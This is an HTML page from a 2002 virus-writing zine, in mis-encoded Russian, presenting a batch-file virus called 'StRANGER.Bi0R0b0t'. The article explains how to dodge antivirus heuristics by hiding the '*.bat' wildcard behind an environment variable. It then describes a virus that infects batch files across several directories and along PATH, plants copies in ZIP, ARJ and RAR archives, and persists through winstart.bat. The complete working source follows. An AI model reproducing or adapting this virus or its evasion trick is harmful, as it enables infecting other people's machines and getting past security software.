<HTML><HEAD>
<TITLE>HABITAT ZINE/ISSUE #3/JUNE 2002 [Virii][StRANGER.Bi0R0b0t] by NeKr0!</TITLE>

<STYLE type=text/css>
BODY {
	FONT-SIZE: 8pt; BACKGROUND: #2c468d; COLOR: #c0c0c0; FONT-FAMILY: "verdana"
}
A:link {
	COLOR: #c0c0c0; TEXT-DECORATION: none;FONT-SIZE: 8pt;
}
A:visited {
	COLOR: #c0c0c0; TEXT-DECORATION: none;FONT-SIZE: 8pt;
}
A:active {
	COLOR: #24bdff; TEXT-DECORATION: none;FONT-SIZE: 8pt;
}
A:hover {
	FONT-SIZE: 8pt; COLOR: #d2e9f9; TEXT-DECORATION: none; font-syle: "verdana"
}
P  {
        FONT-SIZE: 8pt; BACKGROUND: #2c468d; COLOR: #c0c0c0; FONT-FAMILY: "verdana"
   }
H1 {
	FONT-SIZE: 22pt; COLOR: silver; FONT-FAMILY: "Times New Roman"; TEXT-ALIGN: center
}
H3 {
	FONT-SIZE: 14pt; COLOR: silver; FONT-FAMILY: courier; 
}
H4 {
	FONT-SIZE: 12pt; COLOR: silver; FONT-FAMILY: courier; 
}
I {
	COLOR: silver
}
B {
	FONT-WEIGHT: normal; COLOR: silver;FONT-SIZE: 8pt;
}
LI {
	FONT-WEIGHT: bold; MARGIN-LEFT: 3pt; COLOR: silver
}
CITE {
	FONT-WEIGHT: bold; FONT-SIZE: 16pt; COLOR: silver; FONT-FAMILY: "Times New Roman"
}
STRONG {
	FONT-WEIGHT: bold; COLOR: silver
}
</STYLE>

</HEAD>
<BODY topmargin=0 leftmargin=0>

<TABLE BORDER=0 CELLPADDING=0 CELLSPACING=0>
	<TR>
		<TD>
			<IMG SRC="images/habmenu_01.gif" WIDTH=110 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_02.gif" WIDTH=68 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_03.gif" WIDTH=71 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_04.gif" WIDTH=84 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_05.gif" WIDTH=167 HEIGHT=79></TD>
	</TR>
	<TR>
		<TD><a href="hb_content.html"><IMG border=0 SRC="images/habmenu_06.gif" WIDTH=110 HEIGHT=21></a></TD>
		<TD><a href="hb_content.html#virus"><IMG border=0 SRC="images/habmenu_07.gif" WIDTH=68 HEIGHT=21></a></TD>
		<TD><a href="hb_content.html#article"><IMG border=0 SRC="images/habmenu_08.gif" WIDTH=71 HEIGHT=21></a></TD>
		<TD><a href="hb_content.html#rubric"><IMG border=0 SRC="images/habmenu_09.gif" WIDTH=84 HEIGHT=21></a></TD>
		<TD>
			<IMG SRC="images/habmenu_10.gif" WIDTH=167 HEIGHT=21></TD>
	</TR>
</TABLE>
<table width=500 cellspacing=0 cellpadding=10>
<tr><td align=left valign=top width=500>
<h3>BATCH-вирусы : [StRANGER.Bi0R0b0t]</h3>
<p align=justfy>
ѕару слов о евристике...<br>
«начитс€ так, решил € завести себе зверька батовского, но тут выполз один 
доктор ( и вы его знаете! ) и давай подозревать  мою программу во всех смертных 
грехах. » вот вроде раньше небыло в нем евристики на батники -  а тут вроде как 
и есть! ¬ чем же дело? ќказываетс€: вс€ евристика сводитс€ к обнаружению строки
типа:<strong> for %%X3 in (*.bat) do what_you_want</strong>, а конкретно кричит он
именно на <strong>for %%X3 in (*.bat)</strong>.
</p>
<p align=justfy>
“аким образом юзверь может вдруг обнаружить на винте просто эпидемию вс€ких
"возможно, инфицирован BATCH.VIRUS"ов в батниках. Ќо ни ему ни нам этого просто 
ненадо. “ак будем обламывать эту псевдоевристику:<br>
  ”становим переменную среды например<strong> FAKE</strong><br> 
  и присвоим ей значение например <strong> bat</strong><br>  
      <strong><i> set FAKE=bat</i></strong><br>
  ј потом вместо <strong>for %%X3 in (*.bat)</strong> запишем <strong>for %%X3 in (*.%FAKE%)</strong> и все !!!
    ¬от теперь все занимаютс€ своими делами: животинка бегает а веб сосет.
</p>
<p align=justfy>
 онкретно о программе:<br>
«аражаютс€ все батники в текущем каталоге, надкаталоге, в  корневых  каталогах
дисков  C, D, E и во всех каталогах отмеченных переменной PATH. Ѕатники заражаютс€
методом дописывани€ вир€ в конец файла (алгоритм вз€т из BAT.Duke.225).
ѕри этом провер€етс€ соответствие имени батника AUTOEXEC.BAT у который вирусом
не заражаетс€. ѕод виндой, если пременна€  PATH €вно не установлена  то  поиск
идет в C:\WINDOWS и C:\WINDOWS\COMMAND.  роме того поражаютс€ архивы ZIP,ARJ и 
RAR.
в текущем каталоге и надкаталоге (только при наличии архиваторов в PATHe).<br>
<br>
© NeKr0! 17.05.2002
</p>
<img src="images/cuthere.gif">
<pre>
@ctty nul%BR1%
if '%1'=='BR1DiR' goto BR1diRz
if '%1'=='BR1' goto BR1zex
set BR1FK=bat
echo.>BR1.bat
Find "BR1"<%0>>BR1.bat
for %%a in (*.arj ..\*.arj) do arj a %%a BR1.bat
for %%a in (*.zip ..\*.zip) do pkzip %%a BR1.bat
for %%a in (*.rar ..\*.rar) do rar a %%a BR1.bat
for %%r in (%path% . .. c: d: e:) do call BR1.bat BR1DiR %%r
goto BR1pre
:BR1DiRz
for %%c in (%2\*.%BR1FK%) do if not %%c==%2\AUTOEXEC.BAT call BR1.bat BR1 %%c 
goto BR1end
:BR1pre
type BR1.bat >%windir%\winstart.bat
del BR1.bat
goto BR1end
:BR1zex
Find "BR1"<%2>nul
if errorlevel 1 type BR1.bat>>%2
:BR1end [StRANGER.Bi0R0b0t NeKr0!]
</pre>
<img src="images/cuthere.gif">
</BODY>
</HTML>